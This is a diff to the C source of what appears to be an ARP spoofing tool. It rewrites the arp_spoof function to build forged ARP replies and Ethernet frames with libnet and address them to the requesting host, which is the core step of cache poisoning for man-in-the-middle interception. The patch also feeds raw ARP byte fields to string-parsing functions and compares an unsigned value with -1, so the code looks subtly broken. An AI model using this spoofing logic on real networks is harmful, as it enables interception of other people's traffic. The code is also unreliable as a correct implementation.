@@ -146,11 +146,26 @@ int reflect_ip(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet 
 int arp_spoof(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet *ethernet, const struct sniff_arp *arp){
 	libnet_clear_packet(ln_context);
 	// Construct ARP header
+	u_int8_t *dst_mac;
+	u_int32_t dst_ip;
+	int length;
+	dst_mac = libnet_hex_aton(arp->sha, &length);
+	if(dst_mac == NULL){
+		printf("Error converting relayer mac address\n");
+		return(0);
+	}
+	dst_ip = libnet_name2addr4(ln_context, arp->spa, LIBNET_DONT_RESOLVE);
+	if(dst_ip == -1){
+		printf("Error converting relayer ip address\n");
+		return(0);
+	}
+	
+	
 	if ( libnet_autobuild_arp (ARPOP_REPLY,
 		src_mac,
-      		(u_int8_t *)(&arp->tpa),
-      		arp->sha,
-      		(u_int8_t *)(&arp->spa), ln_context) == -1)
+      		(u_int8_t *)(&src_ip),
+      		dst_mac,
+      		(u_int8_t *)(&dst_ip), ln_context) == -1)
   	{
     		fprintf(stderr, "Error building ARP header: %s\n",\
         	libnet_geterror(ln_context));
@@ -161,7 +176,7 @@ int arp_spoof(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet *
 	// Construct Ethernet header
 	const char *aux = ether_ntoa((struct ether_addr *)ethernet->ether_shost);
 	printf("Source ethernet: %s\n", aux);
-	if ( libnet_build_ethernet(ethernet->ether_shost, src_mac, ETHERTYPE_ARP, 
+	if ( libnet_build_ethernet(dst_mac, src_mac, ETHERTYPE_ARP, 
 		NULL, 0, ln_context, 0) == -1 )
   	{
     		fprintf(stderr, "Error building Ethernet header: %s\n",\
